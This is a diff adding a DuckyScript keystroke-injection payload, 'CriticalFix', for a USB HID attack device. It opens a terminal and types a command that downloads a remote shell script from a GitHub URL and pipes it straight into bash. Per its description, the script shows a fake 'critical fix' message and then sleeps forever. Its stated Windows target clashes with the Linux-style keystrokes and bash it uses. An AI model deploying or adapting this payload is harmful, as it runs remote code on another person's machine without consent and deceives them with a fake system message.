@@ -1,0 +1,10 @@
+REM Title: CriticalFix
+REM Author: dsymbol
+REM Description: Bash script that outputs a fake "critical fix" message followed by an infinite sleep
+REM Target: Windows
+
+DELAY 2000
+CTRL-ALT t
+DELAY 500
+STRING curl -s -L https://raw.githubusercontent.com/dsymbol/ducky-payloads/main/CriticalFix/cf.sh | bash
+ENTER
